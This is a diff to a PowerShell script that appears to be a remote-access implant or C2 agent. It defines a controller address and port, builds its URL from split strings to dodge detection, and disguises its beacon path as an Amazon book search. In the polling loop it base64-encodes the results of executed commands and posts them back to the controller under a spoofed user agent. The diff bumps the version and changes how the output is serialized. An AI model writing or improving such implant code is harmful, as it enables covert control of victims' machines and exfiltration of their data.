@@ -1,5 +1,5 @@
 $h0 = "10.0."
-$me = "2.4"
+$me = "2.5"
 $p0rt= "8080"
 $uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 $proto = "ht"+"tp"+":/"+"/"
@@ -94,7 +94,7 @@ while ($True) {
 		}
 
     $jsObject.cmnd = ""
-		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($retval))
+		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
 		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
 		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
 	}
